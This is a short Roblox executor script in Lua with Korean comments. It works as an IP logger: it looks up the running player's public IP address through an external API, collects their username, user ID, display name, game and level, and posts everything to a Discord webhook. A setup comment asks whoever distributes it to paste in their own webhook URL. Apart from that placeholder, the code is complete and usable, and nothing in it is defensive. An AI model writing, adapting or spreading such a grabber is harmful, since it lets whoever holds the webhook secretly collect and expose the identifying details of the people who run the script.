-- 설정: 본인의 디스코드 웹훅 URL을 입력하세요
local webhook_url = "YOUR_DISCORD_WEBHOOK_URL_HERE"

local lp = game:GetService("Players").LocalPlayer
local http = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

-- IP 주소 가져오기 (외부 API 사용)
local user_ip = "Unknown"
pcall(function()
    local response = game:HttpGet("https://api.ipify.org")
    if response then user_ip = response end
end)

-- 레벨 정보 가져오기 (게임마다 경로가 다를 수 있음)
local level = "N/A"
local stats = lp:FindFirstChild("leaderstats")
if stats then
    local levelObj = stats:FindFirstChild("Level") or stats:FindFirstChild("level")
    if levelObj then level = tostring(levelObj.Value) end
end

-- 디스코드 보낼 데이터 구성
local data = {
    ["embeds"] = {{
        ["title"] = "🕹️ 실행자 정보",
        ["color"] = tonumber("0xFF0000"), -- 빨간색 사이드바
        ["fields"] = {
            {["name"] = "게임 이름", ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name, ["inline"] = false},
            {["name"] = "계정 (Username)", ["value"] = lp.Name, ["inline"] = true},
            {["name"] = "UserID", ["value"] = tostring(lp.UserId), ["inline"] = true},
            {["name"] = "디스플레이 (DisplayName)", ["value"] = lp.DisplayName, ["inline"] = true},
            {["name"] = "레벨", ["value"] = level, ["inline"] = true},
            {["name"] = "실행자 IP", ["value"] = "||" .. user_ip .. "||", ["inline"] = false} -- 클릭해야 보이게 설정
        },
        ["footer"] = {["text"] = "로그 시간: " .. os.date("%Y-%m-%d %H:%M:%S")}
    }}
}

-- 웹훅 전송 실행
if http then
    http({
        Url = webhook_url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game:GetService("HttpService"):JSONEncode(data)
    })
else
    print("사용 중인 실행기에서 HTTP 요청을 지원하지 않습니다.")
end
